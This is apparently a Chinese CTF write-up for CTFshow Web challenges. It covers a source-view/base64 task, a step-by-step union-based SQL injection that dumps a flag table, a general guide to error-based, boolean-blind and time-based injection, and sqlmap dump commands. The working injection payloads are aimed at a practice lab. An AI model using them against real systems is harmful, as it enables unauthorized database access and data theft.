---
title: CTFshow Web
created: 2026-03-19T15:15
date: 2026-03-19 15:15:00
permalink: /2026/03/19/Capture_The_Flag_夺旗赛/夺旗赛Write-up/CTFshow/Web/
categories:
  - Capture_The_Flag_夺旗赛
  - 夺旗赛Write-up
  - CTFshow
tags:
  - CTF
  - WriteUp
  - CTFshow
  - Web
updated: 2026-09-26T11:11
---
# Web 1
![](Web/file-20260331130229575.png)
![](Web/file-20260331130229566.png)
Ctrl+U 查看源代码
![](Web/1765884045559-b8bf02c9-df16-4809-8be4-a41302a06020.png)
base64解码
![](Web/1765884078109-a4983cd4-5852-4e05-86f9-68a1f1bcb283.png)
# Web 2
![](Web/file-20260926104314425.png)
## 考查点：

- 基本的SQL注入
- 多表联合查询

在用户名处注入sql语句，密码随意

## 1.查当前数据库名称

```
 ' or 1=1 union select 1,database(),3 limit 1,2;#-- 
```

_得到数据库名称web2_

## 2.查看数据库表的数量

```
' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = 'web2'),3 limit 1,2;#-- 
```

_得到数据库表数量为2_

## 3.查表的名字

**第一个表:**

```
' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 0,1),3 limit 1,2;#-- 
```

_得到表名：flag_ **第二个表:**

```
' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 1,2),3 limit 1,2;#-- 
```

_得到表名：user_

## 4.查flag表列的数量

```
' or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 
```

_只有1列_

## 5.查flag表列的名字

```
' or 1=1 union select 1,(select column_name from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 
```

_列名为flag_

## 6.查flag表记录的数量

```
' or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- 
```

_只有一条记录_

## 7.查flag表记录值

```
' or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- 
```

_得到flag_

# 方法论：SQL 注入回显类型判断流程

> 核心标准：**盲注 = 注入点存在，但页面不把查询结果显示出来**。先确认注入点，再判断回显类型，最后选打法。不要上来就 sqlmap，也不要见到没报错就当成盲注。

## 第一步：确认注入点存在

```
原参数值加单引号     →  页面是否报错/异常/变化
1' and '1'='1   vs  1' and '1'='2   （字符型）
1 and 1=1       vs  1 and 1=2       （数字型）
```

两个请求返回不一样 → 注入点成立。返回完全一样也不要急着放弃，可能就是盲注，继续第二步。

## 第二步：按回显类型选打法（自上而下，命中即停）

### 1. 有数据回显 → 联合查询

页面会显示数据库里的内容（登录后显示用户名、搜索结果显示查询内容）。`order by` 猜列数 + `union select` 直接读数据，最舒服的情况。

```
' or 1=1 union select 1,database(),3 limit 1,2;#
```

_Web 2 就是这种，两分钟拿 flag。payload 末尾 `limit 1,2` 是把第一行（真实用户）跳过，让 union 出来的行变成第一个显示的行。_

### 2. 只有报错回显 → 报错注入

输入单引号后页面显示 MySQL 报错文本（如 `You have an error in your SQL syntax...`）。**这不是盲注**，用报错注入：

```
' and updatexml(1,concat(0x7e,database(),0x7e),1)#
```

### 3. 无数据回显，真假页面有差异 → 布尔盲注

`and 1=1` 和 `and 1=2` 都不显示数据，但页面有可观察差异（"查询成功"vs"查询失败"、正文长短、状态码不同）。用 Burp Repeater + Comparer 对比差异，然后写脚本逐字符二分：

```
' and (select ascii(substr(database(),1,1)))>100#
```

### 4. 页面纹丝不动 → 时间盲注

前三种全失效时的最后手段，不看页面看响应耗时：

```
1' and if(1=1,sleep(5),0)#
```

真条件响应慢 5 秒左右、假条件秒回 → 确认时间盲注。

## 常见误区

- **看不到报错 ≠ 盲注**。单引号返回空页面时容易误判，先试 `or 1=1` 看数据能不能带出来（Web 2 实测：单引号返回空 body，但万能密码直接回显了欢迎语，是回显注入不是盲注）。
- `and 1=1` / `1=2` 无差异，可能只是两种情况都查不到行，都走同一个登录失败页面。
- 报错注入不是盲注——报错文本可见时它比盲注快得多，别急着写二分脚本。

## sqlmap 使用时机

```bash
sqlmap -u "url?id=1" --batch --dbs                                      # GET
sqlmap -u "url" --data "username=1&password=1" -p username --batch --dump   # POST（--data 必须）
```

有回显的题手工注入更快、学习价值更大；**盲注**（逐字符猜要几百次请求）或需要枚举大量表/字段时才上 sqlmap。









































# WAF绕过
想到用焚靖工具：
![](Web/file-20260901130056815.png)
![](Web/file-20260901133558790.png)
